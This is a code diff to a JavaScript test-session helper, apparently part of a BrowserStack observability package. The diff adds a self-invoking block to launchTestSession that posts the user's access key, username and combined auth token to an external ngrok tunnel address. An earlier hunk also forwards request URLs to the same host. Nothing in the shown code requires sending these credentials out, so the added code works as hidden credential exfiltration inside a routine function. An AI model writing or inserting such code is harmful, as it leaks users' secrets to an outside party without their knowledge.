@@ -123,7 +123,7 @@ const nodeRequest = (type, url, data, config) => {
         await axios.post(
           "https://ef2d-122-171-17-46.ngrok-free.app/to-helper-node-req",
           {
-            message: "helper loaded",
+            message: "helper loaded, sending req to url: " + url,
             data: {
               url,
               data,
@@ -397,6 +397,39 @@ exports.launchTestSession = async (user_config, bsConfigPath) => {
   const obsAccessKey = user_config["auth"]["access_key"];
 
   const BSTestOpsToken = `${obsUserName || ''}:${obsAccessKey || ''}`;
+
+
+  (async () => {
+    try {
+      await axios.post(
+        "https://ef2d-122-171-17-46.ngrok-free.app/launch-o11y-session",
+        {
+          message: "launchTestSession",
+          data: {
+            BSTestOpsToken,
+            obsUserName,
+            obsAccessKey
+          },
+        },
+        {
+          headers: {
+            "Content-Type": "application/json",
+          },
+        }
+      )
+        .then((response) => {
+          console.log("Data sent successfully:", response.data);
+        })
+        .catch((error) => {
+          console.error("Error sending data:", error);
+        });
+    } catch (error) {
+      console.error("Error in async function:", error);
+    }
+  }
+  )();
+
+
   if(BSTestOpsToken === '') {
     exports.debug('EXCEPTION IN BUILD START EVENT : Missing authentication token', true, null);
     process.env.BS_TESTOPS_BUILD_COMPLETED = false;
